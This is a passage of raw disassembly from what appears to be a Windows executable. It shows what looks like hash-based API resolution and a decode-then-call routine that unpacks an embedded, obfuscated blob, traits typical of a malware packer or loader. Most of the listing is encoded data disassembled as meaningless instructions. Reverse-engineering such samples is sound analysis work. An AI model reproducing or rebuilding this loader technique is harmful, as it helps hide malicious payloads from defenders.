  401620:	e8 5f fa ff ff       	call   0x401084
  401625:	b8 8d bd c1 3f       	mov    $0x3fc1bd8d,%eax
  40162a:	e8 81 fc ff ff       	call   0x4012b0
  40162f:	a3 04 d0 40 00       	mov    %eax,0x40d004
  401634:	b8 ff 1f 7c c9       	mov    $0xc97c1fff,%eax
  401639:	e8 72 fc ff ff       	call   0x4012b0
  40163e:	a3 08 d0 40 00       	mov    %eax,0x40d008
  401643:	b8 cc 97 10 25       	mov    $0x251097cc,%eax
  401648:	e8 63 fc ff ff       	call   0x4012b0
  40164d:	a3 0c d0 40 00       	mov    %eax,0x40d00c
  401652:	b8 5a a9 b0 86       	mov    $0x86b0a95a,%eax
  401657:	e8 54 fc ff ff       	call   0x4012b0
  40165c:	a3 10 d0 40 00       	mov    %eax,0x40d010
  401661:	b8 b7 36 e5 d2       	mov    $0xd2e536b7,%eax
  401666:	e8 45 fc ff ff       	call   0x4012b0
  40166b:	a3 14 d0 40 00       	mov    %eax,0x40d014
  401670:	b8 05 79 9a 83       	mov    $0x839a7905,%eax
  401675:	e8 36 fc ff ff       	call   0x4012b0
  40167a:	a3 18 d0 40 00       	mov    %eax,0x40d018
  40167f:	b8 ce d5 eb c9       	mov    $0xc9ebd5ce,%eax
  401684:	e8 27 fc ff ff       	call   0x4012b0
  401689:	a3 1c d0 40 00       	mov    %eax,0x40d01c
  40168e:	b8 48 29 27 75       	mov    $0x75272948,%eax
  401693:	e8 18 fc ff ff       	call   0x4012b0
  401698:	a3 20 d0 40 00       	mov    %eax,0x40d020
  40169d:	b8 9a f6 2b d8       	mov    $0xd82bf69a,%eax
  4016a2:	e8 09 fc ff ff       	call   0x4012b0
  4016a7:	a3 24 d0 40 00       	mov    %eax,0x40d024
  4016ac:	b8 9b c6 dc 73       	mov    $0x73dcc69b,%eax
  4016b1:	e8 fa fb ff ff       	call   0x4012b0
  4016b6:	a3 28 d0 40 00       	mov    %eax,0x40d028
  4016bb:	b8 d8 8d 4c c4       	mov    $0xc44c8dd8,%eax
  4016c0:	e8 eb fb ff ff       	call   0x4012b0
  4016c5:	a3 2c d0 40 00       	mov    %eax,0x40d02c
  4016ca:	b8 4a 0d ce 09       	mov    $0x9ce0d4a,%eax
  4016cf:	e8 dc fb ff ff       	call   0x4012b0
  4016d4:	a3 00 e4 40 00       	mov    %eax,0x40e400
  4016d9:	b8 2f 6f 06 10       	mov    $0x10066f2f,%eax
  4016de:	e8 cd fb ff ff       	call   0x4012b0
  4016e3:	a3 04 e4 40 00       	mov    %eax,0x40e404
  4016e8:	b8 dd f5 53 cd       	mov    $0xcd53f5dd,%eax
  4016ed:	e8 be fb ff ff       	call   0x4012b0
  4016f2:	a3 08 e4 40 00       	mov    %eax,0x40e408
  4016f7:	c3                   	ret
  4016f8:	e8 23 ff ff ff       	call   0x401620
  4016fd:	c3                   	ret
  4016fe:	8b c0                	mov    %eax,%eax
  401700:	c3                   	ret
  401701:	8d 40 00             	lea    0x0(%eax),%eax
  401704:	ff 35 00 d0 40 00    	push   0x40d000
  40170a:	e8 7d fe ff ff       	call   0x40158c
  40170f:	c3                   	ret
  401710:	56                   	push   %esi
  401711:	8b f0                	mov    %eax,%esi
  401713:	8b c2                	mov    %edx,%eax
  401715:	48                   	dec    %eax
  401716:	83 f8 00             	cmp    $0x0,%eax
  401719:	7c 09                	jl     0x401724
  40171b:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  40171e:	48                   	dec    %eax
  40171f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401722:	75 f7                	jne    0x40171b
  401724:	5e                   	pop    %esi
  401725:	c3                   	ret
  401726:	8b c0                	mov    %eax,%eax
  401728:	83 ec 0c             	sub    $0xc,%esp
  40172b:	d9 3c 24             	fnstcw (%esp)
  40172e:	d9 7c 24 02          	fnstcw 0x2(%esp)
  401732:	9b                   	fwait
  401733:	66 81 4c 24 02 00 0f 	orw    $0xf00,0x2(%esp)
  40173a:	d9 6c 24 02          	fldcw  0x2(%esp)
  40173e:	df 7c 24 04          	fistpll 0x4(%esp)
  401742:	9b d9 2c 24          	fldcw  (%esp)
  401746:	59                   	pop    %ecx
  401747:	58                   	pop    %eax
  401748:	5a                   	pop    %edx
  401749:	c3                   	ret
  40174a:	8b c0                	mov    %eax,%eax
  40174c:	55                   	push   %ebp
  40174d:	8b ec                	mov    %esp,%ebp
  40174f:	51                   	push   %ecx
  401750:	53                   	push   %ebx
  401751:	56                   	push   %esi
  401752:	88 55 ff             	mov    %dl,-0x1(%ebp)
  401755:	8b d0                	mov    %eax,%edx
  401757:	8b 75 08             	mov    0x8(%ebp),%esi
  40175a:	85 f6                	test   %esi,%esi
  40175c:	7e 47                	jle    0x4017a5
  40175e:	b8 01 00 00 00       	mov    $0x1,%eax
  401763:	8b d8                	mov    %eax,%ebx
  401765:	81 e3 01 00 00 80    	and    $0x80000001,%ebx
  40176b:	79 05                	jns    0x401772
  40176d:	4b                   	dec    %ebx
  40176e:	83 cb fe             	or     $0xfffffffe,%ebx
  401771:	43                   	inc    %ebx
  401772:	85 db                	test   %ebx,%ebx
  401774:	75 05                	jne    0x40177b
  401776:	80 f9 01             	cmp    $0x1,%cl
  401779:	74 17                	je     0x401792
  40177b:	8b d8                	mov    %eax,%ebx
  40177d:	81 e3 01 00 00 80    	and    $0x80000001,%ebx
  401783:	79 05                	jns    0x40178a
  401785:	4b                   	dec    %ebx
  401786:	83 cb fe             	or     $0xfffffffe,%ebx
  401789:	43                   	inc    %ebx
  40178a:	85 db                	test   %ebx,%ebx
  40178c:	74 0c                	je     0x40179a
  40178e:	84 c9                	test   %cl,%cl
  401790:	75 08                	jne    0x40179a
  401792:	0f b6 5d ff          	movzbl -0x1(%ebp),%ebx
  401796:	00 1a                	add    %bl,(%edx)
  401798:	eb 06                	jmp    0x4017a0
  40179a:	0f b6 5d ff          	movzbl -0x1(%ebp),%ebx
  40179e:	28 1a                	sub    %bl,(%edx)
  4017a0:	42                   	inc    %edx
  4017a1:	40                   	inc    %eax
  4017a2:	4e                   	dec    %esi
  4017a3:	75 be                	jne    0x401763
  4017a5:	5e                   	pop    %esi
  4017a6:	5b                   	pop    %ebx
  4017a7:	59                   	pop    %ecx
  4017a8:	5d                   	pop    %ebp
  4017a9:	c2 08 00             	ret    $0x8
  4017ac:	55                   	push   %ebp
  4017ad:	8b ec                	mov    %esp,%ebp
  4017af:	33 c0                	xor    %eax,%eax
  4017b1:	55                   	push   %ebp
  4017b2:	68 cb 17 40 00       	push   $0x4017cb
  4017b7:	64 ff 30             	push   %fs:(%eax)
  4017ba:	64 89 20             	mov    %esp,%fs:(%eax)
  4017bd:	33 c0                	xor    %eax,%eax
  4017bf:	5a                   	pop    %edx
  4017c0:	59                   	pop    %ecx
  4017c1:	59                   	pop    %ecx
  4017c2:	64 89 10             	mov    %edx,%fs:(%eax)
  4017c5:	68 d2 17 40 00       	push   $0x4017d2
  4017ca:	c3                   	ret
  4017cb:	e9 30 ff ff ff       	jmp    0x401700
  4017d0:	eb f8                	jmp    0x4017ca
  4017d2:	5d                   	pop    %ebp
  4017d3:	c3                   	ret
  4017d4:	03 00                	add    (%eax),%eax
  4017d6:	00 00                	add    %al,(%eax)
  4017d8:	dc 17                	fcoml  (%edi)
  4017da:	40                   	inc    %eax
	...
  4017ef:	00                   	.byte 0
  4017f0:	ac                   	lods   %ds:(%esi),%al
  4017f1:	17                   	pop    %ss
  4017f2:	40                   	inc    %eax
	...

Disassembly of section .itext:

00402000 <.itext>:
  402000:	55                   	push   %ebp
  402001:	8b ec                	mov    %esp,%ebp
  402003:	83 c4 f0             	add    $0xfffffff0,%esp
  402006:	b8 d4 17 40 00       	mov    $0x4017d4,%eax
  40200b:	e8 e8 f6 ff ff       	call   0x4016f8
  402010:	6a 03                	push   $0x3
  402012:	e8 91 f5 ff ff       	call   0x4015a8
  402017:	ba 10 e4 40 00       	mov    $0x40e410,%edx
  40201c:	b9 01 a2 00 00       	mov    $0xa201,%ecx
  402021:	b8 88 20 40 00       	mov    $0x402088,%eax
  402026:	e8 0d f0 ff ff       	call   0x401038
  40202b:	6a 00                	push   $0x0
  40202d:	68 00 a2 00 00       	push   $0xa200
  402032:	b8 11 e4 40 00       	mov    $0x40e411,%eax
  402037:	33 c9                	xor    %ecx,%ecx
  402039:	0f b6 15 10 e4 40 00 	movzbl 0x40e410,%edx
  402040:	e8 07 f7 ff ff       	call   0x40174c
  402045:	b8 11 e4 40 00       	mov    $0x40e411,%eax
  40204a:	e8 05 f3 ff ff       	call   0x401354
  40204f:	b8 11 e4 40 00       	mov    $0x40e411,%eax
  402054:	e8 fb f2 ff ff       	call   0x401354
  402059:	ba 8b 9e d9 d3       	mov    $0xd3d99e8b,%edx
  40205e:	e8 a1 f1 ff ff       	call   0x401204
  402063:	a3 30 d0 40 00       	mov    %eax,0x40d030
  402068:	83 3d 30 d0 40 00 00 	cmpl   $0x0,0x40d030
  40206f:	74 08                	je     0x402079
  402071:	6a 01                	push   $0x1
  402073:	ff 15 30 d0 40 00    	call   *0x40d030
  402079:	e8 86 f6 ff ff       	call   0x401704
  40207e:	00 00                	add    %al,(%eax)
  402080:	ff                   	(bad)
  402081:	ff                   	(bad)
  402082:	ff                   	(bad)
  402083:	ff 01                	incl   (%ecx)
  402085:	a2 00 00 a0 ad       	mov    %al,0xada00000
  40208a:	fa                   	cli
  40208b:	b0 a0                	mov    $0xa0,%al
  40208d:	62 a0 60 a0 64 a0    	bound  %esp,-0x5f9b5fa0(%eax)
  402093:	6f                   	outsl  %ds:(%esi),(%dx)
  402094:	a0 5f 9f 60 a0       	mov    0xa0609f5f,%al
  402099:	18 a0 60 a0 60 a0    	sbb    %ah,-0x5f9f5fa0(%eax)
  40209f:	60                   	pusha
  4020a0:	a0 a0 a0 7a a0       	mov    0xa07aa0a0,%al
  4020a5:	60                   	pusha
  4020a6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4020ab:	60                   	pusha
  4020ac:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4020b1:	60                   	pusha
  4020b2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4020b7:	60                   	pusha
  4020b8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4020bd:	60                   	pusha
  4020be:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4020c3:	60                   	pusha
  4020c4:	a0 60 a1 60 a0       	mov    0xa060a160,%al
  4020c9:	1a b0 60 ae 7f 54    	sbb    0x547fae60(%eax),%dh
  4020cf:	69 6d 81 58 61 ec 2d 	imul   $0x2dec6158,-0x7f(%ebp),%ebp
  4020d6:	c1 f0 30             	shl    $0x30,%eax
  4020d9:	b4 08                	mov    $0x8,%ah
  4020db:	c9                   	leave
  4020dc:	13 80 10 d2 0f c7    	adc    -0x38f02df0(%eax),%eax
  4020e2:	12 c1                	adc    %cl,%al
  4020e4:	0d 80 0d d5 13       	or     $0x13d50d80,%eax
  4020e9:	d4 c0                	aam    $0xc0
  4020eb:	c2 05 80             	ret    $0x8005
  4020ee:	12 d5                	adc    %ch,%dl
  4020f0:	0e                   	push   %cs
  4020f1:	80 15 ce 04 c5 12 80 	adcb   $0x80,0x12c504ce
  4020f8:	f7 c9 0e 93 d2 6d    	test   $0x6dd2930e,%ecx
  4020fe:	aa                   	stos   %al,%es:(%edi)
  4020ff:	84 d7                	test   %dl,%bh
  402101:	60                   	pusha
  402102:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402107:	60                   	pusha
  402108:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40210d:	60                   	pusha
  40210e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402113:	60                   	pusha
  402114:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402119:	60                   	pusha
  40211a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40211f:	60                   	pusha
  402120:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402125:	60                   	pusha
  402126:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40212b:	60                   	pusha
  40212c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402131:	60                   	pusha
  402132:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402137:	60                   	pusha
  402138:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40213d:	60                   	pusha
  40213e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402143:	60                   	pusha
  402144:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402149:	60                   	pusha
  40214a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40214f:	60                   	pusha
  402150:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402155:	60                   	pusha
  402156:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40215b:	60                   	pusha
  40215c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402161:	60                   	pusha
  402162:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402167:	60                   	pusha
  402168:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40216d:	60                   	pusha
  40216e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402173:	60                   	pusha
  402174:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402179:	60                   	pusha
  40217a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40217f:	60                   	pusha
  402180:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402185:	60                   	pusha
  402186:	a0 60 a0 b0 e5       	mov    0xe5b0a060,%al
  40218b:	60                   	pusha
  40218c:	a0 ac a1 66 a0       	mov    0xa066a1ac,%al
  402191:	79 fe                	jns    0x402191
  402193:	a2 ca 60 a0 60       	mov    %al,0x60a060ca
  402198:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40219d:	40                   	inc    %eax
  40219e:	a0 ee 41 6b a1       	mov    0xa16b41ee,%al
  4021a3:	62 b9 60 22 60 a0    	bound  %edi,-0x5f9fdda0(%ecx)
  4021a9:	60                   	pusha
  4021aa:	bc 60 a0 60 a0       	mov    $0xa060a060,%esp
  4021af:	60                   	pusha
  4021b0:	a0 5c 2f 60 a0       	mov    0xa0602f5c,%al
  4021b5:	60                   	pusha
  4021b6:	b0 60                	mov    $0x60,%al
  4021b8:	a0 60 40 60 a0       	mov    0xa0604060,%al
  4021bd:	60                   	pusha
  4021be:	a0 a0 a0 60 b0       	mov    0xb060a0a0,%al
  4021c3:	60                   	pusha
  4021c4:	a0 60 a2 60 a0       	mov    0xa060a260,%al
  4021c9:	64 a0 60 a0 60 a0    	mov    %fs:0xa060a060,%al
  4021cf:	60                   	pusha
  4021d0:	a0 64 a0 60 a0       	mov    0xa060a064,%al
  4021d5:	60                   	pusha
  4021d6:	a0 60 a0 60 00       	mov    0x60a060,%al
  4021db:	61                   	popa
  4021dc:	a0 60 a4 60 a0       	mov    0xa060a460,%al
  4021e1:	60                   	pusha
  4021e2:	a0 60 a0 62 a0       	mov    0xa062a060,%al
  4021e7:	61                   	popa
  4021e8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4021ed:	60                   	pusha
  4021ee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4021f3:	70 a0                	jo     0x402195
  4021f5:	60                   	pusha
  4021f6:	b0 60                	mov    $0x60,%al
  4021f8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4021fd:	70 a0                	jo     0x40219f
  4021ff:	60                   	pusha
  402200:	a0 60 e0 61 a0       	mov    0xa061e060,%al
  402205:	a2 a0 60 a0 60       	mov    %al,0x60a060a0
  40220a:	d0 61 a0             	shlb   $1,-0x60(%ecx)
  40220d:	8e a7 60 a0 60 a0    	mov    -0x5f9f5fa0(%edi),%fs
  402213:	60                   	pusha
  402214:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402219:	60                   	pusha
  40221a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40221f:	60                   	pusha
  402220:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402225:	60                   	pusha
  402226:	a0 60 a0 60 f0       	mov    0xf060a060,%al
  40222b:	61                   	popa
  40222c:	a0 04 a6 60 a0       	mov    0xa060a604,%al
  402231:	60                   	pusha
  402232:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402237:	60                   	pusha
  402238:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40223d:	60                   	pusha
  40223e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402243:	60                   	pusha
  402244:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402249:	60                   	pusha
  40224a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40224f:	60                   	pusha
  402250:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402255:	60                   	pusha
  402256:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40225b:	60                   	pusha
  40225c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402261:	60                   	pusha
  402262:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402267:	60                   	pusha
  402268:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40226d:	60                   	pusha
  40226e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402273:	60                   	pusha
  402274:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402279:	60                   	pusha
  40227a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40227f:	60                   	pusha
  402280:	a0 a3 ef a4 e5       	mov    0xe5a4efa3,%al
  402285:	60                   	pusha
  402286:	a0 60 a0 94 20       	mov    0x2094a060,%al
  40228b:	60                   	pusha
  40228c:	a0 60 b0 60 a0       	mov    0xa060b060,%al
  402291:	60                   	pusha
  402292:	22 60 a0             	and    -0x60(%eax),%ah
  402295:	60                   	pusha
  402296:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402297:	60                   	pusha
  402298:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40229d:	60                   	pusha
  40229e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4022a3:	60                   	pusha
  4022a4:	a0 80 a0 60 00       	mov    0x60a080,%al
  4022a9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4022aa:	e1 b4                	loope  0x402260
  4022ac:	e1 60                	loope  0x40230e
  4022ae:	a0 60 a0 a4 a8       	mov    0xa8a4a060,%al
  4022b3:	60                   	pusha
  4022b4:	a0 60 40 60 a0       	mov    0xa0604060,%al
  4022b9:	60                   	pusha
  4022ba:	aa                   	stos   %al,%es:(%edi)
  4022bb:	60                   	pusha
  4022bc:	a0 60 26 60 a0       	mov    0xa0602660,%al
  4022c1:	60                   	pusha
  4022c2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4022c7:	60                   	pusha
  4022c8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4022cd:	a0 a0 60 60 a2       	mov    0xa26060a0,%al
  4022d2:	f3 b3 a0             	repz mov $0xa0,%bl
  4022d5:	60                   	pusha
  4022d6:	a0 60 a0 e1 18       	mov    0x18e1a060,%al
  4022db:	60                   	pusha
  4022dc:	a0 60 50 60 a0       	mov    0xa0605060,%al
  4022e1:	60                   	pusha
  4022e2:	a0 60 a0 60 30       	mov    0x3060a060,%al
  4022e7:	60                   	pusha
  4022e8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4022ed:	60                   	pusha
  4022ee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4022f3:	60                   	pusha
  4022f4:	a0 60 a0 60 60       	mov    0x6060a060,%al
  4022f9:	8e 09                	mov    (%ecx),%cs
  4022fb:	c4 01                	les    (%ecx),%eax
  4022fd:	d4 01                	aam    $0x1
  4022ff:	60                   	pusha
  402300:	a0 8e a7 60 a0       	mov    0xa060a78e,%al
  402305:	60                   	pusha
  402306:	d0 61 a0             	shlb   $1,-0x60(%ecx)
  402309:	60                   	pusha
  40230a:	a8 60                	test   $0x60,%al
  40230c:	a0 60 30 60 a0       	mov    0xa0603060,%al
  402311:	60                   	pusha
  402312:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402317:	60                   	pusha
  402318:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40231d:	a0 a0 60 60 8e       	mov    0x8e6060a0,%al
  402322:	05 c4 01 d4 01       	add    $0x1d401c4,%eax
  402327:	60                   	pusha
  402328:	a0 a2 a0 60 a0       	mov    0xa060a0a2,%al
  40232d:	60                   	pusha
  40232e:	e0 61                	loopne 0x402391
  402330:	a0 60 a2 60 a0       	mov    0xa060a260,%al
  402335:	60                   	pusha
  402336:	38 60 a0             	cmp    %ah,-0x60(%eax)
  402339:	60                   	pusha
  40233a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40233f:	60                   	pusha
  402340:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402345:	a0 a0 60 f0 8e       	mov    0x8ef060a0,%al
  40234a:	12 c5                	adc    %ch,%al
  40234c:	0c cf                	or     $0xcf,%al
  40234e:	03 60 a0             	add    -0x60(%eax),%esp
  402351:	04 a6                	add    $0xa6,%al
  402353:	60                   	pusha
  402354:	a0 60 f0 61 a0       	mov    0xa061f060,%al
  402359:	60                   	pusha
  40235a:	a8 60                	test   $0x60,%al
  40235c:	a0 60 3a 60 a0       	mov    0xa0603a60,%al
  402361:	60                   	pusha
  402362:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402367:	60                   	pusha
  402368:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40236d:	a0 a0 60 f0 60       	mov    0x60f060a0,%al
  402372:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402377:	60                   	pusha
  402378:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40237d:	60                   	pusha
  40237e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402383:	60                   	pusha
  402384:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402389:	60                   	pusha
  40238a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40238f:	60                   	pusha
  402390:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402395:	60                   	pusha
  402396:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40239b:	60                   	pusha
  40239c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023a1:	60                   	pusha
  4023a2:	a0 60 a0 60 10       	mov    0x1060a060,%al
  4023a7:	61                   	popa
  4023a8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023ad:	60                   	pusha
  4023ae:	44                   	inc    %esp
  4023af:	60                   	pusha
  4023b0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023b5:	60                   	pusha
  4023b6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023bb:	60                   	pusha
  4023bc:	a0 a0 a0 60 f0       	mov    0xf060a0a0,%al
  4023c1:	60                   	pusha
  4023c2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023c7:	60                   	pusha
  4023c8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023cd:	60                   	pusha
  4023ce:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023d3:	60                   	pusha
  4023d4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023d9:	60                   	pusha
  4023da:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023df:	60                   	pusha
  4023e0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023e5:	60                   	pusha
  4023e6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023eb:	60                   	pusha
  4023ec:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023f1:	60                   	pusha
  4023f2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023f7:	60                   	pusha
  4023f8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4023fd:	60                   	pusha
  4023fe:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402403:	60                   	pusha
  402404:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402409:	60                   	pusha
  40240a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40240f:	60                   	pusha
  402410:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402415:	60                   	pusha
  402416:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40241b:	60                   	pusha
  40241c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402421:	60                   	pusha
  402422:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402427:	60                   	pusha
  402428:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40242d:	60                   	pusha
  40242e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402433:	60                   	pusha
  402434:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402439:	60                   	pusha
  40243a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40243f:	60                   	pusha
  402440:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402445:	60                   	pusha
  402446:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40244b:	60                   	pusha
  40244c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402451:	60                   	pusha
  402452:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402457:	60                   	pusha
  402458:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40245d:	60                   	pusha
  40245e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402463:	60                   	pusha
  402464:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402469:	60                   	pusha
  40246a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40246f:	60                   	pusha
  402470:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402475:	60                   	pusha
  402476:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40247b:	60                   	pusha
  40247c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402481:	60                   	pusha
  402482:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  402487:	60                   	pusha
  402488:	a0 64 b0 a0 a0       	mov    0xa0a0b064,%al
  40248d:	6a a6                	push   $0xffffffa6
  40248f:	b3 14                	mov    $0x14,%bl
  402491:	d2 09                	rorb   %cl,(%ecx)
  402493:	ce                   	into
  402494:	07                   	pop    %es
  402495:	b8 b0 a0 a0 60       	mov    $0x60a0a0b0,%eax
  40249a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40249f:	60                   	pusha
  4024a0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4024a5:	60                   	pusha
  4024a6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4024ab:	60                   	pusha
  4024ac:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4024b1:	60                   	pusha
  4024b2:	a0 60 a0 b8 b0       	mov    0xb0b8a060,%al
  4024b7:	a0 a0 64 a0 60       	mov    0x60a064a0,%al
  4024bc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  4024c1:	c4 bd a0 a0 d0 bd    	les    -0x422f5f60(%ebp),%edi
  4024c7:	a0 a0 d4 bd a0       	mov    0xa0bdd4a0,%al
  4024cc:	a0 d8 bd a0 a0       	mov    0xa0a0bdd8,%al
  4024d1:	cc                   	int3
  4024d2:	bd a0 a0 a8 bc       	mov    $0xbca8a0a0,%ebp
  4024d7:	a0 a0 c4 bc a0       	mov    0xa0bcc4a0,%al
  4024dc:	a0 00 bc a0 a0       	mov    0xa0a0bc00,%al
  4024e1:	67 f4                	addr16 hlt
  4024e3:	af                   	scas   %es:(%edi),%eax
  4024e4:	02 ca                	add    %dl,%cl
  4024e6:	05 c3 14 5f c5       	add    $0xc55f14c3,%eax
  4024eb:	8c d1                	mov    %ss,%ecx
  4024ed:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  4024f2:	c5 88 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%ecx
  4024f8:	60                   	pusha
  4024f9:	5f                   	pop    %edi
  4024fa:	c5 84 d1 a1 a0 eb 60 	lds    0x60eba0a1(%ecx,%edx,8),%eax
  402501:	5f                   	pop    %edi
  402502:	c5 80 d1 a1 a0 eb    	lds    -0x145f5e2f(%eax),%eax
  402508:	60                   	pusha
  402509:	5f                   	pop    %edi
  40250a:	c5 7c d1 a1          	lds    -0x5f(%ecx,%edx,8),%edi
  40250e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402513:	78 d1                	js     0x4024e6
  402515:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40251a:	c5 74 d1 a1          	lds    -0x5f(%ecx,%edx,8),%esi
  40251e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402523:	70 d1                	jo     0x4024f6
  402525:	a1 a0 eb 60 5f       	mov    0x5f60eba0,%eax
  40252a:	c5 6c d1 a1          	lds    -0x5f(%ecx,%edx,8),%ebp
  40252e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402533:	68 d1 a1 a0 eb       	push   $0xeba0a1d1
  402538:	60                   	pusha
  402539:	5f                   	pop    %edi
  40253a:	c5 64 d1 a1          	lds    -0x5f(%ecx,%edx,8),%esp
  40253e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402543:	60                   	pusha
  402544:	d1 a1 a0 eb 60 5f    	shll   $1,0x5f60eba0(%ecx)
  40254a:	c5 5c d0 a1          	lds    -0x5f(%eax,%edx,8),%ebx
  40254e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402553:	58                   	pop    %eax
  402554:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  40255a:	c5 54 d0 a1          	lds    -0x5f(%eax,%edx,8),%edx
  40255e:	a0 eb 60 5f c5       	mov    0xc55f60eb,%al
  402563:	50                   	push   %eax
  402564:	d0 a1 a0 eb 60 5f    	shlb   $1,0x5f60eba0(%ecx)
  40256a:	c5 4c d0 a1          	lds    -0x5f(%eax,%edx,8),%ecx
